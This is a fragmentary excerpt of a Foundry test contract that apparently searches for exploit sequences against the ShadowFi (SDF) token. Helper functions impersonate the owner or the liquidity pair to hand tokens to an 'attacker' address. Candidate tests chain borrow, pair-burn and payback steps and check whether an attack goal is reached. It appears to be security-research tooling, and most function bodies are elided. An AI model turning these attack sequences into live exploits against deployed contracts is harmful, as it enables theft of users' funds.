...
contract ShadowFiTest is Test, BlockLoader {
    ...
    function borrow_owner_sdf(uint256 amount) internal {
        vm.stopPrank();
        vm.prank(owner);
    ...
    function payback_owner_sdf(uint256 amount) internal {
    ...
    function borrow_pair_sdf(uint256 amount) internal {
        vm.stopPrank();
        vm.prank(address(pair));
        sdf.transfer(attacker, amount);
        vm.startPrank(attacker);
    ...
    function payback_pair_sdf(uint256 amount) internal {
    ...
    function check_cand000(uint256 amt0, uint256 amt1, uint256 amt2) public {
        ...
        borrow_owner_sdf(amt0);
        burn_pair_sdf(amt1);
        payback_owner_sdf(amt2);
        assert(!attackGoal());
        vm.stopPrank();
    }
    ...
    function check_cand001(uint256 amt0, uint256 amt1, uint256 amt2) public {
        ...
        vm.warp(blockTimestamp);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pair_sdf(amt0);
        burn_pair_sdf(amt1);
        payback_pair_sdf(amt2);
        assert(!attackGoal());
        vm.stopPrank();
    }
